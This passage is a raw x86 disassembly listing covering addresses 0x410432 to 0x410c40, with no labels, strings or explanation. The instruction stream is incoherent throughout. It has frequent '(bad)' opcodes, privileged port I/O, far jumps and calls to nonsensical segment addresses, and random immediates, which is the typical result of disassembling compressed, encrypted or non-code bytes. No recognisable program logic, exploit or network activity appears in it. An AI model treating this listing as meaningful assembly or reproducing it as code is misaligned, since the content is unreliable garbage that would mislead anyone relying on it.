  410432:	sbb    BYTE PTR [ecx],ch
  410434:	in     eax,dx
  410435:	ficom  DWORD PTR [ebx]
  410437:	jno    0x4103c2
  410439:	int3   
  41043a:	div    bl
  41043c:	cmp    BYTE PTR [ebp-0x1f],cl
  41043f:	jno    0x410430
  410441:	(bad)  
  410442:	(bad)  [ebp+0x4794d43c]
  410448:	retf   0x88b5
  41044b:	pop    esi
  41044c:	cwde   
  41044d:	dec    esi
  41044e:	push   esi
  41044f:	(bad)  
  410450:	fisttp QWORD PTR [esi]
  410452:	cmp    al,0xfb
  410454:	push   ecx
  410455:	push   ds
  410456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410458:	shl    ch,cl
  41045a:	outs   dx,DWORD PTR ds:[esi]
  41045b:	adc    DWORD PTR [esi+0x3a],0xbc68842e
  410462:	sub    al,0xa0
  410464:	sub    DWORD PTR [esi*1+0x194a563d],edi
  41046b:	jge    0x41042e
  41046d:	out    dx,al
  41046e:	pop    edi
  41046f:	mov    dl,0xa6
  410471:	pop    esi
  410472:	comiss xmm5,DWORD PTR [eax+0x3787fd8d]
  410479:	push   ecx
  41047a:	mov    esi,0xfb2515d5
  41047f:	jmp    0xbea7:0xf546659c
  410486:	cmc    
  410487:	inc    ebx
  410488:	mov    esi,0xe4afb043
  41048d:	dec    eax
  41048e:	push   edx
  41048f:	and    al,bl
  410491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410492:	sbb    DWORD PTR es:[esi-0x4a33513a],ebp
  410499:	pop    edx
  41049a:	rcl    DWORD PTR ds:0x5798dafc,0xd
  4104a1:	sbb    ebp,DWORD PTR [ebx+0x21]
  4104a4:	dec    ebp
  4104a5:	(bad)  
  4104a6:	cmp    BYTE PTR [ebp-0xe],ah
  4104a9:	sub    BYTE PTR [edx-0x4a6a3cea],ch
  4104af:	push   0xfad3653e
  4104b4:	ins    DWORD PTR es:[edi],dx
  4104b5:	push   ss
  4104b6:	inc    ebx
  4104b7:	and    DWORD PTR [ecx-0x71b3a4b3],eax
  4104bd:	sub    edi,DWORD PTR [ecx]
  4104bf:	and    al,0x2c
  4104c1:	push   ebx
  4104c2:	sar    esp,0x15
  4104c5:	pop    edi
  4104c6:	jl     0x4104ce
  4104c8:	fdivr  st,st(3)
  4104ca:	inc    edi
  4104cb:	sub    ebx,DWORD PTR [esi+0x5ebd2704]
  4104d1:	and    esi,DWORD PTR es:0xafc6f1b9
  4104d8:	pop    ss
  4104d9:	inc    di
  4104db:	jle    0x4104f4
  4104dd:	test   DWORD PTR [ebx+0x76ee23f],edi
  4104e3:	mov    eax,ds:0x2fd95386
  4104e8:	xchg   edi,eax
  4104e9:	pop    ebp
  4104eb:	repnz adc esp,eax
  4104ee:	div    DWORD PTR ss:[esi-0x10685a2f]
  4104f5:	mov    cl,dh
  4104f7:	jle    0x410521
  4104f9:	icebp  
  4104fa:	rol    DWORD PTR ds:0xff320885,cl
  410500:	adc    esi,DWORD PTR [edi-0x49de0b70]
  410506:	sub    ebp,DWORD PTR ds:0x6b41d7bd
  41050c:	pushf  
  41050d:	lods   al,BYTE PTR ds:[esi]
  41050e:	pop    eax
  41050f:	sub    al,BYTE PTR [ebp-0x50]
  410512:	popf   
  410513:	xlat   BYTE PTR ds:[ebx]
  410514:	fild   WORD PTR [edi]
  410516:	lock cmp al,0x26
  410519:	inc    esi
  41051a:	mov    esi,DWORD PTR [edx+0x626d8ae2]
  410520:	push   es
  410521:	mov    bh,0xb6
  410523:	sbb    eax,0xf9dc5bdb
  410528:	dec    esi
  410529:	push   0x85e3b78a
  41052e:	or     al,0xce
  410530:	in     al,0x6
  410532:	mov    BYTE PTR [ebx+ebx*8],bl
  410535:	neg    cl
  410537:	test   eax,0x1c675498
  41053c:	test   BYTE PTR [ebx],0x82
  41053f:	pop    ss
  410540:	cli    
  410541:	aas    
  410542:	dec    edi
  410543:	imul   ah
  410545:	push   0xffffff89
  410547:	les    ebp,FWORD PTR [eax+0xd]
  41054a:	jnp    0x410511
  41054c:	inc    esp
  41054d:	adc    ecx,DWORD PTR [eax+0x61]
  410550:	dec    ebx
  410551:	into   
  410552:	mov    WORD PTR [esi+0x72e7857a],es
  410558:	push   ebp
  410559:	mov    esp,0x850fd58e
  41055e:	out    0x34,eax
  410560:	out    0x26,eax
  410562:	jecxz  0x4105d4
  410564:	mov    ebp,0x769e913b
  410569:	jnp    0x41052f
  41056b:	pop    ebp
  41056c:	mov    eax,ebp
  41056e:	sti    
  41056f:	sbb    ebx,edi
  410571:	jo     0x41057d
  410573:	mov    es,WORD PTR [ebp+0x5c]
  410576:	adc    eax,0x9beb267f
  41057b:	std    
  41057c:	popf   
  41057d:	into   
  41057e:	rcr    DWORD PTR [ebx+0x21310799],0x21
  410585:	test   DWORD PTR [edi-0x5],ecx
  410588:	mov    edx,0x43e79633
  41058d:	pop    eax
  41058e:	jb     0x41056d
  410590:	mov    al,0x51
  410592:	in     al,0x18
  410594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410595:	les    edi,FWORD PTR [ebp+0x36]
  410598:	cwde   
  410599:	jmp    0x5b38:0x21ce798a
  4105a0:	out    dx,al
  4105a1:	in     al,0xd4
  4105a3:	sub    bl,dh
  4105a5:	in     al,dx
  4105a6:	stc    
  4105a7:	push   cs
  4105a8:	inc    ebp
  4105a9:	sti    
  4105aa:	inc    eax
  4105ab:	hlt    
  4105ac:	add    eax,0xbb6261a7
  4105b1:	jle    0x41056f
  4105b3:	ins    BYTE PTR es:[edi],dx
  4105b4:	jmp    0x989d8620
  4105b9:	sahf   
  4105ba:	xor    al,dh
  4105bc:	dec    ebx
  4105bd:	add    dh,BYTE PTR [edi]
  4105bf:	mov    cl,0xf9
  4105c1:	jo     0x4105bd
  4105c3:	popa   
  4105c4:	cmp    eax,0x458e320e
  4105c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105ca:	rol    DWORD PTR [ecx-0x67],cl
  4105cd:	mov    eax,0xa448ed2b
  4105d2:	mov    eax,ds:0xef88238c
  4105d7:	loope  0x410612
  4105d9:	jno    0x410630
  4105db:	and    bh,BYTE PTR [edi+0x68]
  4105de:	les    edi,FWORD PTR [esi]
  4105e0:	icebp  
  4105e1:	mov    eax,0x6ca9454b
  4105e6:	jne    0x410584
  4105e8:	iret   
  4105e9:	in     al,dx
  4105ea:	xchg   edx,eax
  4105eb:	inc    DWORD PTR [eax+eax*4]
  4105ee:	lock adc bh,BYTE PTR [edi]
  4105f1:	xchg   DWORD PTR [eax],ebp
  4105f3:	gs mov ah,0x9c
  4105f6:	jne    0x4105dc
  4105f8:	inc    DWORD PTR [ebx-0x6771c4a3]
  4105fe:	sar    ah,cl
  410600:	and    eax,0x22f97e
  410605:	ins    BYTE PTR es:[edi],dx
  410606:	jmp    DWORD PTR [edx-0x64]
  410609:	and    DWORD PTR [eax],ebx
  41060b:	or     bh,BYTE PTR [esi-0x48a221b9]
  410611:	frstor [eax-0x22720688]
  410617:	xor    ch,dh
  410619:	dec    esi
  41061a:	cwde   
  41061b:	mov    eax,ds:0x3d64203f
  410620:	out    dx,al
  410621:	retf   
  410622:	pop    ebp
  410623:	loope  0x4105ec
  410625:	aaa    
  410626:	pop    eax
  410627:	lock mov bl,0x44
  41062a:	jle    0x410651
  41062c:	sub    eax,0xdb516e95
  410631:	lahf   
  410632:	retf   
  410633:	sahf   
  410634:	data16 lahf 
  410636:	cli    
  410637:	sbb    DWORD PTR [ebx-0x31e89a04],0xe52d8717
  410641:	imul   ebx,DWORD PTR [ebp-0x3e],0x85773c9f
  410648:	(bad)  
  410649:	mov    bh,0xd4
  41064b:	arpl   WORD PTR [esi-0x24],dx
  41064e:	mov    ds:0x93944bd,eax
  410653:	mov    esp,0xf5cf4c01
  410658:	gs push edi
  41065a:	push   cs
  41065b:	jo     0x410632
  41065d:	and    ecx,DWORD PTR [esi]
  41065f:	cmp    BYTE PTR [ebx-0x22b6cad0],ch
  410665:	inc    eax
  410666:	rcl    DWORD PTR es:[esi+0x56],cl
  41066a:	mov    bh,0x74
  41066c:	jmp    0x41067c
  41066e:	add    al,0x1a
  410670:	xor    eax,0x2a624794
  410675:	mov    ?,WORD PTR [esi-0x62b43e14]
  41067b:	gs sti 
  41067d:	daa    
  41067e:	fnstcw WORD PTR ds:0x98c1a87b
  410684:	add    ebx,ebx
  410686:	cdq    
  410687:	fisttp QWORD PTR [edx+0x66e5912d]
  41068d:	inc    ecx
  41068e:	retf   0x6ddd
  410691:	xor    esi,DWORD PTR [eax-0x1f7415de]
  410697:	imul   edi,DWORD PTR [ecx],0xbdf49cc4
  41069d:	xor    al,0xc
  41069f:	sbb    ebx,edx
  4106a1:	lods   al,BYTE PTR ds:[esi]
  4106a2:	fdivr  DWORD PTR [ebx]
  4106a4:	push   ds
  4106a5:	dec    eax
  4106a6:	jmp    0x41066f
  4106a8:	xchg   BYTE PTR [esi+0x27],dh
  4106ab:	xor    eax,0x4668206c
  4106b0:	cdq    
  4106b1:	xchg   ecx,eax
  4106b2:	test   al,0xf4
  4106b4:	cli    
  4106b5:	cmp    eax,0xb3332115
  4106ba:	push   ss
  4106bb:	int    0xd0
  4106bd:	jle    0x410710
  4106bf:	and    al,BYTE PTR [esi]
  4106c1:	call   0x4e0aeb2d
  4106c6:	imul   ebx,DWORD PTR [ecx],0xac5db010
  4106cc:	(bad)  
  4106cd:	ficom  DWORD PTR [ebx]
  4106cf:	dec    ebx
  4106d0:	adc    ah,dh
  4106d2:	inc    esi
  4106d3:	pop    esi
  4106d4:	add    al,0xc3
  4106d6:	(bad)  
  4106d9:	scas   eax,DWORD PTR es:[edi]
  4106da:	cmp    edx,DWORD PTR [edx+0x5cdf07d7]
  4106e0:	push   ds
  4106e1:	push   cs
  4106e2:	adc    edx,edx
  4106e4:	dec    eax
  4106e5:	test   al,0x74
  4106e7:	add    al,0xde
  4106e9:	and    BYTE PTR [esi-0x7ec62d8d],ah
  4106ef:	loope  0x410768
  4106f1:	mov    ebp,0x78197c
  4106f6:	jmp    0xdb80:0x758621fb
  4106fd:	mov    edx,0x832ea3f0
  410702:	mov    ebp,0xe579eceb
  410707:	mov    WORD PTR [ebx+0x6d],cs
  41070a:	adc    ch,al
  41070c:	sbb    al,0xe5
  41070e:	sar    DWORD PTR [ebp+0x8fa5598],0xba
  410715:	sbb    DWORD PTR [ebp+0x34fe92ba],ebp
  41071b:	lods   al,BYTE PTR ds:[esi]
  41071c:	or     eax,0xb4a2a1bc
  410721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410722:	push   es
  410723:	(bad)  
  410724:	aas    
  410725:	pop    eax
  410726:	push   0x2e53e1c0
  41072b:	mov    WORD PTR [eax+0x56],es
  41072e:	and    ch,BYTE PTR [ebx]
  410730:	sub    BYTE PTR [ebp+0x50],bh
  410733:	xor    ebx,ecx
  410735:	ss inc edx
  410737:	mov    edi,0x7accfd09
  41073c:	call   0x2a537e4
  410741:	popa   
  410742:	mov    al,0xc4
  410744:	(bad)  
  410745:	je     0x410787
  410747:	mov    DWORD PTR [eax-0x385dc6b6],ebx
  41074d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41074e:	sbb    BYTE PTR [ebp-0x4c],ch
  410751:	retf   0x731d
  410754:	push   ebx
  410755:	rcr    DWORD PTR [edx+edi*1-0x4a],cl
  410759:	int3   
  41075a:	mov    al,ds:0xacb79a95
  41075f:	lods   al,BYTE PTR ds:[esi]
  410760:	inc    edx
  410761:	sbb    BYTE PTR [esi+0x5c0bde79],dh
  410767:	test   al,0xd3
  410769:	jne    0x410787
  41076b:	adc    eax,0x88a51c6d
  410770:	pop    edx
  410771:	aam    0xd5
  410773:	js     0x410714
  410775:	push   ds
  410776:	add    eax,0x11a4453
  41077b:	mov    ebx,0x3a61592f
  410780:	(bad)  
  410781:	push   edi
  410782:	mov    eax,0x3e52911c
  410787:	push   eax
  410788:	cmp    ebp,edi
  41078a:	jp     0x410740
  41078c:	dec    ecx
  41078d:	cmp    al,0x4a
  41078f:	int    0x75
  410791:	cmp    BYTE PTR [edi],dl
  410793:	popa   
  410794:	or     eax,0xffa71188
  410799:	rcl    BYTE PTR [ebp+0x7d07207e],cl
  41079f:	in     al,dx
  4107a0:	dec    edx
  4107a1:	cmp    bl,ch
  4107a3:	ret    
  4107a4:	popf   
  4107a5:	popa   
  4107a6:	push   es
  4107a7:	jmp    0x410739
  4107a9:	jmp    0x410777
  4107ab:	add    DWORD PTR [eax],ebx
  4107ad:	int    0xc8
  4107af:	jno    0x4107ac
  4107b1:	mov    edx,0x7737122e
  4107b6:	daa    
  4107b7:	sub    ebp,esp
  4107b9:	sar    BYTE PTR [eax],cl
  4107bb:	mov    dl,0xae
  4107bd:	(bad)  
  4107be:	ss jle 0x4107b5
  4107c1:	inc    ebx
  4107c2:	inc    ebp
  4107c3:	jo     0x410788
  4107c5:	aaa    
  4107c6:	jno    0x410773
  4107c8:	jg     0x41077c
  4107ca:	pop    ecx
  4107cb:	adc    dh,BYTE PTR [ecx-0x3e38a84d]
  4107d1:	mov    ecx,0x99657d07
  4107d6:	test   al,0x59
  4107d8:	into   
  4107d9:	push   edx
  4107da:	fs jmp 0xfed7:0x2415f91f
  4107e2:	jae    0x4107ad
  4107e4:	mov    al,ds:0x352c582c
  4107e9:	dec    ecx
  4107ea:	mov    eax,ds:0xef586332
  4107ef:	xor    eax,0xd9361199
  4107f4:	dec    edi
  4107f5:	ret    0x357
  4107f8:	push   cs
  4107f9:	shl    DWORD PTR [edx],0x7b
  4107fc:	mov    eax,ds:0x77d64950
  410801:	inc    ebx
  410802:	mov    eax,0xfed8d412
  410807:	push   ss
  410808:	test   BYTE PTR [ecx+0x7d],dl
  41080b:	pop    ds
  41080c:	jecxz  0x410793
  41080e:	js     0x4107c5
  410810:	inc    ecx
  410811:	imul   eax,DWORD PTR ds:[ebx+0x36c12c5f],0xffffffe5
  410819:	inc    eax
  41081a:	xchg   edx,eax
  41081b:	loopne 0x4107e5
  41081d:	cli    
  41081e:	sti    
  41081f:	mov    cs,WORD PTR [edx+edx*4]
  410822:	mov    ebx,0x1a008fb7
  410827:	adc    cl,bh
  410829:	jae    0x41082d
  41082b:	cmp    esp,DWORD PTR [eax-0x1761571c]
  410831:	adc    eax,0xa029a358
  410836:	jno    0x410808
  410838:	repnz scas al,BYTE PTR es:[edi]
  41083a:	dec    edx
  41083b:	in     al,dx
  41083c:	push   ss
  41083d:	sbb    DWORD PTR [eax+0x43],esp
  410840:	or     edx,edi
  410842:	cmp    BYTE PTR [ebx+0x15],bh
  410845:	outs   dx,BYTE PTR ds:[esi]
  410846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410847:	xor    dh,al
  410849:	dec    edx
  41084a:	test   BYTE PTR [edx+0x63eb2635],bh
  410850:	iret   
  410851:	(bad)  
  410853:	or     BYTE PTR [eax],cl
  410855:	ret    0x84a1
  410858:	xor    al,BYTE PTR [esi-0x24]
  41085b:	std    
  41085c:	ret    0x8691
  41085f:	iret   
  410860:	jo     0x410882
  410862:	mov    DWORD PTR [esi+0x2426b35b],edi
  410868:	add    eax,0x37c38acd
  41086d:	mov    WORD PTR [edi+0x40],cs
  410870:	out    dx,eax
  410871:	jp     0x4107fa
  410873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410874:	call   0x650811f7
  410879:	fst    DWORD PTR [ebx+0x38e8b214]
  41087f:	xchg   ecx,eax
  410880:	dec    ecx
  410881:	ret    
  410882:	mov    DWORD PTR [edx-0x44b7fbed],edx
  410888:	dec    eax
  410889:	push   ss
  41088a:	lods   al,BYTE PTR ds:[esi]
  41088b:	jp     0x41083e
  41088d:	out    0xd1,al
  41088f:	push   ebp
  410890:	mov    ebp,0x9cbf7625
  410895:	cmc    
  410896:	adc    bh,0x80
  410899:	push   esi
  41089a:	or     DWORD PTR [esp+eiz*2+0x64aa791f],0x7e85f7d2
  4108a5:	jge    0x41084b
  4108a7:	jno    0x4108c2
  4108a9:	dec    eax
  4108aa:	adc    al,BYTE PTR [edi+ecx*8+0x4a]
  4108ae:	push   es
  4108af:	aad    0x88
  4108b1:	and    DWORD PTR [ecx-0x5e],esi
  4108b4:	ds test al,0xb0
  4108b7:	mov    ebx,0x4970fd2
  4108bc:	outs   dx,DWORD PTR ds:[esi]
  4108bd:	mov    esi,0x99665d5d
  4108c2:	lods   al,BYTE PTR cs:[esi]
  4108c4:	fcmovnu st,st(1)
  4108c6:	int3   
  4108c7:	sti    
  4108c8:	dec    sp
  4108ca:	lea    ebp,[ecx-0x26882258]
  4108d0:	xchg   ebx,eax
  4108d1:	xchg   esi,eax
  4108d2:	mov    ch,0x49
  4108d4:	loop   0x410909
  4108d6:	(bad)  
  4108d7:	das    
  4108d8:	cwde   
  4108d9:	xchg   BYTE PTR [ebp+0xd],bl
  4108dc:	add    al,0x34
  4108de:	stc    
  4108df:	fs xchg ecx,eax
  4108e1:	cdq    
  4108e2:	dec    edi
  4108e3:	outs   dx,DWORD PTR ds:[esi]
  4108e4:	jp     0x41089d
  4108e6:	stos   BYTE PTR es:[edi],al
  4108e7:	add    ch,BYTE PTR [esi-0x76]
  4108ea:	xor    eax,0xc0df8b72
  4108ef:	xchg   esp,eax
  4108f0:	xor    BYTE PTR [edx+eax*2],0x3b
  4108f4:	iret   
  4108f5:	cmp    al,0xc1
  4108f7:	sbb    eax,0xfd68b638
  4108fc:	mov    esp,ebp
  4108fe:	or     eax,ebx
  410900:	sub    eax,0x2fed73ee
  410905:	jmp    0xaa42:0xe74ba8
  41090c:	sbb    ebx,edx
  41090e:	rcl    DWORD PTR [edx+eax*1+0x62],0x97
  410913:	jecxz  0x410924
  410915:	je     0x4108bf
  410917:	arpl   di,ax
  410919:	das    
  41091a:	call   0xf8cd:0x6a990fbf
  410921:	jl     0x410932
  410923:	outs   dx,BYTE PTR ds:[esi]
  410924:	add    edi,eax
  410926:	ins    DWORD PTR es:[edi],dx
  410927:	loope  0x4108e3
  410929:	cmp    al,0x4d
  41092b:	gs popf 
  41092d:	pop    ss
  41092e:	mov    WORD PTR [ecx-0x5ad5cec8],ss
  410934:	pop    ecx
  410935:	sar    BYTE PTR [esi-0x1],1
  410938:	xor    DWORD PTR [ebp+0x250ce8fe],edx
  41093e:	mov    edx,0x3b527f35
  410943:	nop
  410944:	xor    dl,ch
  410946:	js     0x41097b
  410948:	or     al,0x9b
  41094a:	(bad)  
  41094c:	push   edx
  41094d:	in     eax,0xc1
  41094f:	inc    edi
  410950:	dec    ebp
  410951:	xor    BYTE PTR ds:[ecx-0x2e],bh
  410955:	and    ch,BYTE PTR [ebp+0x2f]
  410958:	sahf   
  410959:	iret   
  41095a:	pop    ecx
  41095b:	arpl   WORD PTR ds:0x51ebe02b,bp
  410961:	rcl    edx,cl
  410963:	bound  edi,QWORD PTR [eax-0x171e1eb0]
  410969:	xchg   ecx,eax
  41096a:	stos   BYTE PTR es:[edi],al
  41096b:	mov    ecx,0x6a2f10bf
  410970:	and    al,0xce
  410972:	int    0xe7
  410974:	push   edx
  410975:	mov    cl,0xdd
  410977:	jo     0x410909
  410979:	(bad)
  41097d:	nop
  41097e:	aaa    
  41097f:	mov    ebp,0x95ed9e39
  410984:	jnp    0x410920
  410986:	push   eax
  410987:	cmp    al,0xf4
  410989:	gs aaa 
  41098b:	dec    esp
  41098c:	mov    bh,0x7b
  41098e:	sub    eax,0xc5f8c228
  410993:	push   esp
  410994:	push   cs
  410995:	jns    0x410929
  410997:	mov    edx,0xeb8636d
  41099c:	mov    al,0x78
  41099e:	outs   dx,BYTE PTR ds:[esi]
  41099f:	xor    al,0xdf
  4109a1:	int3   
  4109a2:	rcl    esi,cl
  4109a4:	push   edi
  4109a5:	ret    
  4109a6:	loope  0x410a08
  4109a8:	int3   
  4109a9:	jo     0x4109ac
  4109ab:	lods   al,BYTE PTR ds:[esi]
  4109ac:	test   DWORD PTR [ebx-0x21],0x391c9529
  4109b3:	adc    al,0xce
  4109b5:	xlat   BYTE PTR ds:[ebx]
  4109b6:	mov    bh,0xf5
  4109b8:	cmp    DWORD PTR [eax+0x7eaef130],esp
  4109be:	call   0xae22:0xb4b
  4109c4:	fisub  DWORD PTR [edx-0x3c]
  4109c7:	(bad)  [esi-0x11c64779]
  4109cd:	dec    edi
  4109ce:	leave  
  4109cf:	test   eax,0x94acea96
  4109d4:	and    edx,esi
  4109d6:	pop    ecx
  4109d7:	adc    ch,ah
  4109d9:	xor    al,BYTE PTR es:[ebp-0x80]
  4109dd:	aad    0x8a
  4109df:	iret   
  4109e0:	cdq    
  4109e1:	(bad)
  4109e4:	gs cwde 
  4109e6:	or     ebp,DWORD PTR [ebp-0x197fb030]
  4109ec:	psubq  mm4,QWORD PTR [ebp+0x7c435021]
  4109f3:	mov    esi,ebp
  4109f5:	in     eax,dx
  4109f6:	loope  0x410978
  4109f8:	out    0x1a,al
  4109fa:	mov    BYTE PTR [edi],0xb8
  4109fd:	in     eax,0x85
  4109ff:	rol    DWORD PTR [esi-0x56],0x4c
  410a03:	pusha  
  410a04:	les    eax,FWORD PTR [esi+esi*1-0x19]
  410a08:	add    eax,0x894904cd
  410a0d:	popf   
  410a0e:	cmp    al,0xf
  410a10:	hlt    
  410a11:	popf   
  410a12:	jne    0x410a18
  410a14:	mov    esp,0xc7dccdf8
  410a19:	dec    esp
  410a1a:	loope  0x4109ca
  410a1c:	push   eax
  410a1d:	nop
  410a1e:	loop   0x4109cc
  410a20:	cli    
  410a21:	int    0x1a
  410a23:	int3   
  410a24:	ret    
  410a25:	cwde   
  410a26:	retf   
  410a27:	(bad)  
  410a28:	aas    
  410a29:	fcmovb st,st(4)
  410a2b:	dec    ecx
  410a2c:	lea    edi,[ebx+0x4]
  410a2f:	inc    ecx
  410a30:	inc    esi
  410a31:	(bad)  
  410a32:	leave  
  410a33:	popa   
  410a34:	jb     0x4109c8
  410a36:	jge    0x410a53
  410a38:	pop    ecx
  410a39:	jns    0x410a3e
  410a3b:	mov    ds:0xc7a8c9b6,al
  410a40:	or     DWORD PTR ss:[bx+si],esi
  410a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a45:	mov    dl,0x5c
  410a47:	push   ds
  410a48:	mov    eax,ds:0x88b5f68b
  410a4d:	mov    ?,WORD PTR [esi+eax*2]
  410a50:	ja     0x410aa8
  410a52:	fs es fs mov bl,0xf7
  410a57:	or     DWORD PTR [ecx+0x67],esi
  410a5a:	cdq    
  410a5b:	adc    ebp,eax
  410a5d:	adc    esp,DWORD PTR [edi-0x7e]
  410a60:	and    eax,esp
  410a62:	xchg   ecx,eax
  410a63:	jge    0x4109f9
  410a65:	xchg   esi,eax
  410a66:	sub    esp,DWORD PTR [edx+0x3aee058a]
  410a6c:	cdq    
  410a6d:	mov    esi,0x8e6cb0a1
  410a72:	in     al,dx
  410a73:	aad    0x7b
  410a75:	push   edi
  410a76:	imul   eax,DWORD PTR [eax-0x67],0x6
  410a7a:	cmp    DWORD PTR ds:0x507267a3,ebp
  410a80:	xor    ecx,DWORD PTR [esi-0x1a]
  410a83:	or     eax,0x6c453b88
  410a88:	shl    BYTE PTR [esi],1
  410a8a:	popf   
  410a8b:	pop    ebp
  410a8c:	fcom   DWORD PTR [ecx+0x2cd78663]
  410a92:	imul   ebx
  410a94:	clc    
  410a95:	fwait
  410a96:	xchg   DWORD PTR [edx+0x77232b23],edi
  410a9c:	repnz pushf 
  410a9e:	pop    esp
  410a9f:	retf   
  410aa0:	mov    eax,0xb7bc104e
  410aa5:	cmp    eax,0xac26806d
  410aaa:	ret    0x998c
  410aad:	sub    BYTE PTR [esi],bh
  410aaf:	mov    eax,0x5941a4da
  410ab4:	mov    eax,0xa3792ed5
  410ab9:	mov    al,ds:0xa90d48dc
  410abe:	ret    
  410abf:	int3   
  410ac0:	sti    
  410ac1:	jecxz  0x410b06
  410ac3:	stos   DWORD PTR es:[edi],eax
  410ac4:	std    
  410ac5:	loopne 0x410afc
  410ac7:	mov    ch,0x3b
  410ac9:	xlat   BYTE PTR ds:[ebx]
  410aca:	nop
  410acb:	pop    ecx
  410acc:	fcom   DWORD PTR [ebx+esi*1]
  410acf:	mov    ecx,ebp
  410ad1:	fld    DWORD PTR [ebp-0x28a3b82b]
  410ad7:	aaa    
  410ad8:	adc    eax,0xc14773de
  410add:	dec    edi
  410ade:	mov    ds,WORD PTR [esi+0x3e]
  410ae1:	sbb    cl,BYTE PTR [ebx+0x19]
  410ae4:	call   0xf4bd:0xfa7b3ff9
  410aeb:	push   esi
  410aec:	pinsrw mm1,WORD PTR [edx],0x62
  410af0:	int    0xaa
  410af2:	icebp  
  410af3:	sbb    DWORD PTR [ebp+0xf],ecx
  410af6:	cli    
  410af7:	mov    edx,0xc0750219
  410afc:	pop    es
  410afd:	fstp   TBYTE PTR [ebx-0x7b]
  410b00:	xchg   ecx,eax
  410b01:	ror    DWORD PTR [edx-0x7cac28e2],cl
  410b07:	adc    DWORD PTR [ebx],ecx
  410b09:	pop    esp
  410b0a:	dec    eax
  410b0b:	add    ah,cl
  410b0d:	or     BYTE PTR [esi+edi*1],bl
  410b10:	inc    edi
  410b11:	dec    esi
  410b12:	js     0x410b07
  410b14:	or     dl,BYTE PTR [edi-0x69]
  410b17:	dec    esp
  410b18:	test   BYTE PTR [eax-0x1],bl
  410b1b:	xchg   ebp,eax
  410b1c:	add    esp,DWORD PTR fs:[eax-0x4707e434]
  410b23:	loop   0x410b6f
  410b25:	or     dl,BYTE PTR [ebx+edx*4-0x5cf1f317]
  410b2c:	push   0xffffffc4
  410b2e:	push   0xffffff9c
  410b30:	inc    esp
  410b31:	jmp    0x96d9abf4
  410b36:	push   0xffffffe2
  410b38:	mov    DWORD PTR [ecx+0x20978550],esi
  410b3e:	lods   al,BYTE PTR ds:[esi]
  410b3f:	jo     0x410b76
  410b41:	arpl   WORD PTR [eax-0x41c4c798],di
  410b47:	jmp    0x1020:0x7ea9308e
  410b4e:	pop    edi
  410b4f:	push   ss
  410b50:	mov    al,ds:0x2003978e
  410b55:	push   ds
  410b56:	mov    cl,0x31
  410b58:	rcl    edi,cl
  410b5a:	dec    eax
  410b5b:	mov    edx,0x52e9f4d9
  410b60:	gs xchg edi,eax
  410b62:	add    al,0x7a
  410b64:	and    eax,0xd558ea00
  410b6a:	mov    eax,0x1e41754d
  410b6f:	daa    
  410b70:	jns    0x410b17
  410b72:	mov    ds:0x89f3f0fc,al
  410b77:	sar    edi,0x88
  410b7a:	lods   al,BYTE PTR ds:[esi]
  410b7b:	push   0x290ee054
  410b80:	mov    cl,0x55
  410b82:	loope  0x410b3a
  410b84:	sbb    eax,ecx
  410b86:	(bad)  
  410b87:	xchg   ebp,eax
  410b88:	pop    ebx
  410b89:	lods   al,BYTE PTR ds:[esi]
  410b8a:	xor    BYTE PTR [ebx+ecx*2+0x6990953c],bl
  410b91:	ins    BYTE PTR es:[edi],dx
  410b92:	push   edx
  410b93:	dec    edx
  410b94:	scas   eax,DWORD PTR es:[edi]
  410b95:	mov    esp,0x284c207c
  410b9a:	adc    al,0x89
  410b9c:	sbb    edx,esp
  410b9e:	das    
  410b9f:	mov    esi,0xd9361eb
  410ba4:	xchg   edx,eax
  410ba5:	sahf   
  410ba6:	adc    DWORD PTR [esi-0x4fda8dbb],0x4f9caf87
  410bb0:	(bad)
  410bb3:	or     bh,0x37
  410bb6:	das    
  410bb7:	ret    0x93e8
  410bba:	mov    edi,DWORD PTR [edi]
  410bbc:	sbb    ch,cl
  410bbe:	cmp    al,0x83
  410bc0:	nop
  410bc1:	sub    al,0x84
  410bc3:	je     0x410b82
  410bc5:	sbb    al,0xf5
  410bc7:	inc    ebx
  410bc8:	mov    edi,0xd6d1d68f
  410bcd:	ja     0x410bb4
  410bcf:	cmp    eax,0xbcbed324
  410bd4:	jbe    0x410b7b
  410bd6:	out    dx,al
  410bd7:	mov    dl,0xd8
  410bd9:	mov    eax,0x94d90672
  410bde:	mov    ebp,0xbd85bc50
  410be3:	xor    eax,0x58f5bf79
  410be8:	ins    DWORD PTR es:[edi],dx
  410be9:	cmp    al,0x40
  410beb:	in     al,dx
  410bec:	sbb    bh,ch
  410bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bef:	(bad)  
  410bf0:	ja     0x410bf6
  410bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bf3:	mov    ah,BYTE PTR [esi+eax*2]
  410bf6:	add    DWORD PTR [ecx],ecx
  410bf8:	jb     0x410c01
  410bfa:	retf   0xaba3
  410bfd:	cmp    eax,0x36650414
  410c02:	scas   al,BYTE PTR es:[edi]
  410c03:	dec    edx
  410c04:	push   es
  410c05:	or     DWORD PTR [edx+esi*8-0x37],esp
  410c09:	or     eax,0xd9906653
  410c0e:	jge    0x410c30
  410c10:	or     cl,BYTE PTR [ecx+esi*1-0x2e]
  410c14:	mov    dl,0xa4
  410c16:	sub    DWORD PTR [edx+ecx*1+0x41acc7be],0x6832c718
  410c21:	fild   DWORD PTR [ebx]
  410c23:	pop    eax
  410c24:	je     0x410c9c
  410c26:	lods   al,BYTE PTR ds:[esi]
  410c27:	loope  0x410c79
  410c29:	add    DWORD PTR [edx-0x17c8037c],0xfffffffb
  410c30:	in     eax,0xeb
  410c32:	sbb    BYTE PTR [ecx+ebp*4-0x4e9f71d6],ah
  410c39:	xlat   BYTE PTR ds:[ebx]
  410c3a:	outs   dx,BYTE PTR ds:[esi]
  410c3b:	pop    es
  410c3c:	out    dx,eax
  410c3d:	fsub   QWORD PTR [esi+0x1]
  410c40:	cmp    DWORD PTR [bx],ebp
